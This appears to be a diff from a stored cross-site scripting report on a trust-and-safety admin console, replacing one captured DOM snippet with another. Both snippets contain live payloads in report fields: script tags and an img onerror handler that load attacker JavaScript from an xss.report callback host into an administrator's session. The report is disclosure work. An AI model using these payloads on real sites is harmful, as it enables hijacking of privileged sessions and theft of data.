@@ -27,83 +27,15 @@ When an administrative user or reviewer inspects submitted safety reports within
 ### Vulnerable DOM Snippet
 
 ```html
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>TrustDesk · Review Queue</title>
-    <link rel="stylesheet" href="../assets/style.css">
-  </head>
-  <body class="admin-shell">
-    <header class="admin-top">
-      <a class="brand" href="../index.php"><span class="shield">✦</span>TrustDesk</a>
-      <div>
-        <span>Review console</span>
-        <a href="logout.php">Sign out</a>
-      </div>
-    </header>
-    <main class="admin-main">
-      <div class="admin-title">
-        <div>
-          <span class="eyebrow">TRUST &amp; SAFETY CONSOLE</span>
-          <h1>Review queue</h1>
-        </div>
-        <a class="button dark" href="../report.php">New report ↗</a>
-      </div>
-      <div class="stats">
-        <div><small>New</small><strong>2</strong></div>
-        <div><small>Investigating</small><strong>0</strong></div>
-        <div><small>Action required</small><strong>0</strong></div>
-        <div><small>Resolved</small><strong>0</strong></div>
-        <div><small>Closed</small><strong>0</strong></div>
-      </div>
-      <form class="filters">
-        <input name="q" value="" placeholder="Search case, title, email, username">
-        <select name="status">
-          <option value="">All statuses</option>
-          <option value="new">New</option>
-          <option value="investigating">Investigating</option>
-          <option value="action_required">Action required</option>
-          <option value="resolved">Resolved</option>
-          <option value="closed">Closed</option>
-        </select>
-        <select name="severity">
-          <option value="">All severity</option>
-          <option value="low">Low</option>
-          <option value="medium">Medium</option>
-          <option value="high">High</option>
-          <option value="critical">Critical</option>
-        </select>
-        <button class="button">Filter</button>
-      </form>
-      <div class="queue">
-        <a class="queue-row" href="view.php?id=2">
-          <div class="q-main">
-            <span class="case-id">TD-5E3685DC</span>
-            <h3>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></h3>
-            <p>asd@gmail.com · Content</p>
-          </div>
-          <div class="q-meta">
-            <span class="status status-new">new</span>
-            <b class="sev-medium">medium</b>
-            <small>Nov 9, 2026</small>
-          </div>
-        </a>
-        <a class="queue-row" href="view.php?id=1">
-          <div class="q-main">
-            <span class="case-id">TD-4481BE73</span>
-            <h3>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></h3>
-            <p>hello@gmail.com · User</p>
-          </div>
-          <div class="q-meta">
-            <span class="status status-new">new</span>
-            <b class="sev-low">low</b>
-            <small>Oct 22, 2026</small>
-          </div>
-        </a>
-      </div>
-    </main>
-  </body>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Case TD-5E3685DC · TrustDesk</title><link rel="stylesheet" href="../assets/style.css"></head><body class="admin-shell">
+<header class="admin-top"><a class="brand" href="../index.php"><span class="shield">✦</span>TrustDesk</a><div><a href="index.php">← Queue</a><a href="logout.php">Sign out</a></div></header>
+<main class="case-admin"><div class="case-admin-head"><div><span class="eyebrow">TD-5E3685DC</span><h1>'"&gt;<script src="https://xss.report/c/vansh"></script></h1></div><span class="status status-new">new</span></div>
+<div class="admin-columns"><section class="case-card"><h3>Report details</h3><dl><dt>Type</dt><dd>Content</dd><dt>Severity</dt><dd>Medium</dd><dt>Reporter</dt><dd>'"&gt;&lt;ScriPt src=https://xss.report/c/vansh&gt;&lt;/ScriPt&gt;  · asd@gmail.com</dd><dt>Target</dt><dd>'"&gt;<script src="https://xss.report/c/vansh"></script>  · '"&gt;<script src="https://xss.report/c/vansh"></script></dd><dt>Submitted</dt><dd>2026-11-09 02:20:41</dd></dl><hr><h3>Description</h3><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p><h3>Evidence / context</h3><p>'"&gt;<script src="https://xss.report/c/vansh"></script></p></section>
+<aside><form class="case-card" action="update.php" method="post"><input type="hidden" name="csrf" value="a20efa2ff9ed832ea09ba1a1d6385476535d11e1fcfbe70bebd8ba0466f89d95"><input type="hidden" name="id" value="2"><h3>Case action</h3><label>Status<select name="status"><option selected="" value="new">New</option><option value="investigating">Investigating</option><option value="action_required">Action required</option><option value="resolved">Resolved</option><option value="closed">Closed</option></select></label><label>Severity<select name="severity"><option value="low">Low</option><option selected="" value="medium">Medium</option><option value="high">High</option><option value="critical">Critical</option></select></label><label>Customer-facing response<textarea name="admin_response" rows="6"></textarea></label><button class="button dark wide">Save case update</button></form>
+<form class="case-card" action="update.php" method="post"><input type="hidden" name="csrf" value="a20efa2ff9ed832ea09ba1a1d6385476535d11e1fcfbe70bebd8ba0466f89d95"><input type="hidden" name="id" value="2"><input type="hidden" name="action" value="note"><h3>Internal note</h3><textarea name="note" rows="4" required="" placeholder="Only staff can see this note"></textarea><button class="button wide">Add note</button></form></aside></div>
+<section class="history"><h3>Case activity</h3><div><span>•</span><p>Report submitted and added to the review queue<small>2026-11-09 02:20:41</small></p></div></section>
+</main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
+<iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe><iframe class="html2canvas-container" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;" width="1718" height="1059" scrolling="no" data-html2canvas-ignore="true"></iframe></body></html>
 ```
 ## Impact
 Execution of arbitrary JavaScript code within the high-privilege session of an administrator or safety reviewer examining submitted reports.
